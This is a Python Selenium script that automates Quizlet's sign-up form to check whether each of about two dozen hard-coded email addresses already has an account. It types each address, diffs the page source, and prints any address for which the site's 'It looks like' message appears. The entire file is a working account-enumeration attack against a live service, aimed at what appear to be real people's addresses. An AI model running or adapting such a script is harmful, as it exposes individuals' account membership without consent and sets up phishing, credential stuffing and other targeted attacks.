from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')


print("The usernames present in quizlet are:")
for i in ["ccohen@aol.com", "superman@gmail.com", "keijser@aol.com", "superman@gmail.com", "ajohnson@hotmail.com", "rnewman@aol.com", "sfoskett@hotmail.com", "seurat@aol.com", "richard@gmail.com", "punkis@gmail.com", "jadavis@outlook.com", "staffelb@att.net", "pplinux@icloud.com", "lamky@optonline.net", "ccoerhen@aol.com", "keijserqer@aol.com", "ajohneesdson@hotmail.com", "rnewman@aol.com", "sfosksdett@hotmail.com", "seusdrat@aol.com", "richard@gmail.com", "pssunkis@gmail.com", "jadavssis@outlook.com", "stafssfelb@att.net", "pplinsdux@icloud.com", "laamky@optonline.net"]:
#for i in ["superman@gmail.com", "batman@gmail.com", "sdkfnsdkfnksdnfksdf@gmail.com"]:
    user = i

    driver.get("https://quizlet.com/")
    element = driver.find_element_by_xpath("//*[@id='TopNavigationReactTarget']/header/div/div[2]/div[3]/button[2]/span")
    element.click()
    sleep(1)

    p1 = driver.page_source

    elem = driver.find_element_by_xpath("//input[@type='email']")
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)

    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)
    if "It looks like" in p3:
        print(user)
